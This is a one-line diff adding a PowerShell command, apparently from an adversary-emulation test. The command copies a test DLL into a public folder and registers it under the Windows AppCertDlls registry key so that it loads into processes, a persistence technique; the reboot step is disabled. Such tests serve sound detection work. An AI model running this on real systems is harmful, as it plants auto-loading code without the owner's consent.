@@ -1,0 +1,1 @@
+Copy-Item "7e8ee7_AtomicTest.dll" C:\Users\Public\AtomicTest.dll -Force; reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f; if($false){Restart-Computer}
